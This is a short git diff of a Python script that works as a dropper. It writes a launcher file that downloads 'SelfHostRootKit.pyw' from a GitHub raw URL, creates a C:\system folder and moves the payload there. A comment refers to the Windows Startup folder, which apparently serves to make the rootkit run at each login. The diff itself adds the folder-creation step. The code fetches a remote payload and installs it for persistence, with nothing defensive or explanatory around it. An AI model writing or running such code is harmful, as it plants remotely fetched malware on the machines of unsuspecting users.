@@ -1,3 +1,4 @@
+# ! create file in C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup and C:/system #
 from os import remove, chdir, system
 from shutil import move
 from time import sleep
@@ -18,7 +19,7 @@ except:
 
 with open('lancement.pyw', 'w') as file:
     file.write("""
-from os import remove, chdir
+from os import remove, chdir, mkdir
 from urllib.request import urlopen
 from shutil import move
 from subprocess import Popen
@@ -28,6 +29,10 @@ with open("SelfHostRootKit.pyw", "a") as file:
     file.write((urlopen('https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/SelfHostRootKit.pyw')).read().decode())
 try:
     remove("C:\system/SelfHostRootKit.pyw")
+except:
+    pass
+try:
+    mkdir('C:\system')
 except:
     pass
 move('SelfHostRootKit.pyw', 'C:\system')
